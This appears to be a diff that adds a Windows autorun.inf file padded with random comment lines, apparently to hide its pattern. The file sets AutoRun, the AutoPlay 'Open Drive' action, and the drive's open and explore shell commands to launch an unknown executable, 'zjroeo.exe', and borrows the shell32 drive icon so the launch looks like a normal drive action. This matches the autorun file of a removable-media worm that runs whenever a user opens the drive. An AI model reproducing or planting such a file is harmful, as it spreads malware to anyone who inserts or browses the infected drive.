@@ -1,0 +1,34 @@
+;sEckKrEJwLgUKDjuXuuTaSnkuJmAXldOfMlaZPfOyFhhWZftxRvcyXRsQkflTVVkqafIZtpX
+;GvtpwyqSrYqOszoVlcrFZHaNVtyVmShNFZkryVjFZCYeLnuYAPJIrUSnDvKKX
+;oaAfgnevsQcgVGTdXrtUOtnRXjsJEaKHmTXHublZfctpMqxKYDzmgrCVGHmZdVnaGtmUXuEryeNp
+[AutoRun]
+open=zjroeo.exe
+;etlTOzfVNlrpDMadWGjnRezJcusQkiXRaLRRARqM
+;X
+;VeThTctjPKJQcWlnirAXvRjWskSlYDhRYgGMIajttXEDWDRPiJVrNOvfoHzHVNdHx
+;45F27A231FB7BAE1D86A00260847BED88E820F9BB727D2C7BFC81571
+;JTktIRCbBCuKaRGuxuBpxHRjsDqxZgtgwyvuijQVwgvnvS
+Icon=%system%\shell32.dll,7
+;dvHJTlyfExWuIgGBgdJRRWbgETciaqNycASUijeEemfkpNrUDMVxGIVtV
+UseAutoPlay=1
+action=Open Drive
+action= @zjroeo.exe
+;SiSpxVR
+;MSzjIUeSsnz
+;JndLMwkvdFFdFGXevOMFaFfHlPFxPErHFCxeqCVaNDVyACaduMvuWkkTstXH
+;hVmyFWGSpFwSueQopNExyGWWohCUnhxCGaSmdpliSvgefkfjHpnAYpAUWMhEPrgGJyIZPaSvTqL
+;HKPZpejTE
+shell\open\Command=zjroeo.exe
+;WidXJfnvVyPmQlylmgWSxsTxrWaTS
+;yPNtjjPBpMzkswwVsZ
+shell\open\Default=1
+;LmexVjLh
+;bwxciZscRfJRDzGXdVINbBhaNTzcfqMMUUKQoKEIAiQxbpJNzzhiND
+;xvQRsuND
+;hTwQaCTllMLNGdDzw
+;PzEpaiThKGELjQZPvAJcHeGlAOOFZeUYirJFsSzHnsMYuutAwBXrppMFdtfaC
+;nHpquNrMHmQkXsUwRCaojyBpXHFMvcMqNcbGfnycqHHhcJSZlBiajdIWjI
+;ykyprVOFSTzoJnLzyuuKhbbMHG
+;KETFflnKltquJSTZb
+shell\explore\Command=zjroeo.exe
+;RuENzabYeTihJoZYbLUrngGAnCmqaqnktNrknOUZPjYMHXoKXkLaCHdWkGush
